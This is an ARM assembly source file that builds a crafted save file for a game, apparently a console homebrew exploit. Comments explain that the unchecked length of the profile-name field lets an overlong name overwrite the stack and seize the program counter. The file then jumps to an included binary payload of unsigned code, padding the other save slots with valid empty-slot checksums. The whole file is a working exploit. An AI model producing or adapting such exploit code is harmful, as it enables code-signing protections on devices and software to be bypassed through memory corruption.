.arm
.global _start
.section .init

#define PAYLOAD_ADR 0x020b9e84
#define EMPTY_SLOT_CRC32 0x21591197

_start:
		.ascii "rPcB"	@ PARA-Header
		.ascii "BreakingNews"	@ Slot-1 Profile name; The player name has a limit of 15 character strings to create the save-slot. The string length/size is not checked so using a long extensive string, one can overwrite several stack registers and take control of the Point Counter(0x1A7 bytes) and using it to jump to your unsigned code from the stack.
		.fill 0x10, 1, 0x20
		.word PAYLOAD_ADR	@ The payload address will jump to the offset of 0x1900 to execute unsigned code.
		.fill 0xFC, 1, 0x20
		.org 0x63C
		.word 0	@ CRC32
	
misc_data:
		@ Profile Data Slot-2
		.ascii "rErP"
		.fill 0x638, 1, 0xFF
		.word EMPTY_SLOT_CRC32
	
	
		@ Profile Data Slot-3
		.ascii "rErP"
		.fill 0x638, 1, 0xFF
		.word EMPTY_SLOT_CRC32
	
	
		@ Profile Data Slot-4
		.ascii "rErP"
		.fill 0x638, 1, 0xFF
		.word EMPTY_SLOT_CRC32
	
	
payload:
		.incbin "./payload/payloadn.bin"		@ Unsigned code injected here :)
		.fill 0xB0, 1, 0xFF